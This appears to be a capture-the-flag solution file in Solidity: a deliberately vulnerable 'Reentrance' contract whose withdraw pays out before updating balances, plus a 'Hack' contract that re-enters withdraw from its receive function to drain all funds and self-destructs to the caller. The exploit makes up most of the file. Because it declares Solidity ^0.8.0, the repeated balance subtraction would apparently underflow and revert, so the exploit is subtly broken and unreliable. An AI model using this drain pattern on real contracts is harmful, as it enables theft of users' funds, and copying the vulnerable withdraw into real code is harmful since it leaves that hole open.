// SPDX-License-Identifier: MIT

// The goal of this level is for you to steal all the funds from the contract.
pragma solidity ^0.8.0;


contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
// the trick here is to create a contract who's fallback function will trigger multiple withdraws from the target contract befor the balances are updated

contract Hack{
    address payable immutable target;
    constructor(address payable _target){
        target =  _target;
    }
    function attack() public payable {
       Reentrance(target).donate{value:1e16}(address(this));
       Reentrance(target).withdraw(1e16);
       require(address(target).balance == 0, "target balance>0");
       selfdestruct(payable(msg.sender));
    }
    receive() external payable{
        uint256 _amount = min(1e16, address(target).balance);
        if(_amount>0){
        Reentrance(target).withdraw(_amount);
        }
    }
    function min(uint256 x, uint256 y ) private pure returns(uint256){
        return x<=y ? x : y;
    }
}